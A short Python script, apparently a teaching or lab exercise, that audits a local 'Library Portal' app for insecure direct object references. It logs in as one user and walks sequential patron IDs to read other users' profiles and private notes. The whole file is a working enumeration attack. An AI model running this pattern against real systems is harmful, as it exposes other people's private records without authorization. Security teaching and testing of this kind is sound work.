import requests

BASE_URL = "http://127.0.0.1:5000"

def run_idor_audit():
    print("[*] Starting Automated IDOR Audit against Library Portal...")
    
    # Create a persistent session to maintain cookies/login state
    session = requests.Session()
    
    # Step 1: Authenticate as 'bob_reader' (ID 2)
    login_payload = {'username': 'bob_reader'}
    login_res = session.post(f"{BASE_URL}/", data=login_payload)
    
    if login_res.status_code == 200:
        print("[+] Successfully authenticated as session user: bob_reader")
    else:
        print("[-] Authentication failed. Make sure app.py is running!")
        return

    # Step 2: Probe sequential patron IDs (IDOR fuzzing)
    print("\n[*] Fuzzing patron profile IDs (1 to 5) using Bob's session...")
    for patron_id in range(1, 6):
        target_url = f"{BASE_URL}/patron/profile/{patron_id}"
        res = session.get(target_url)
        
        if res.status_code == 200:
            if f"Profile Details for ID: {patron_id}" in res.text:
                print(f"[VULNERABILITY FOUND] IDOR Access Granted! Successfully read data for Patron ID {patron_id}")
                # Optional: extract private notes from HTML response text snippet
                if "Private Notes" in res.text:
                    print(f"    -> Sensitive record accessed without authorization.")
            else:
                print(f"[-] ID {patron_id}: Page loaded, but content unexpected.")
        elif res.status_code == 404:
            print(f"[-] ID {patron_id}: Patron does not exist.")
        else:
            print(f"[!] ID {patron_id}: Access blocked or error (Status: {res.status_code})")

    print("\n[*] Audit complete. Notice how Bob was able to view profiles belonging to other users.")

if __name__ == '__main__':
    run_idor_audit() 